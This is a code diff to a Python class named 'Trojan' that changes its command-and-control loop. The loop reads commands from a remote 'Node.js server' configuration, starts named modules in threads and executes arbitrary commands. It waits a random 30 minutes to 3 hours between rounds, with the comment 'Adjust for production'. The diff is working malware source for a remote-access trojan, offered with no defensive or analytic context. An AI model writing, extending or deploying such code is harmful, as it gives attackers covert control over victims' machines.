@@ -96,12 +96,19 @@ class Trojan:
 
                 # Execute commands from Node.js server
                 for command in nodejs_config.get('commands', []):
-                    print(f"[*] Executing command: {command}")
-                    if command.startswith("run_module:"):
-                        module_name = command.split(":")[1]
-                        thread = threading.Thread(target=self.module_runner, args=(module_name,))
-                        thread.start()
+                    if isinstance(command, dict):
+                        if command.get("action") == "run_module":
+                            module_name = command.get("module")
+                            if module_name:
+                                thread = threading.Thread(target=self.module_runner, args=(module_name,))
+                                thread.start()
+                        else:
+                            command_str = command.get("command")
+                            if command_str:
+                                print(f"[*] Executing command: {command_str}")
+                                self.execute_command(command_str)
                     else:
+                        print(f"[*] Executing command: {command}")
                         self.execute_command(command)
 
             time.sleep(random.randint(30*60, 3*60*60))  # Adjust for production
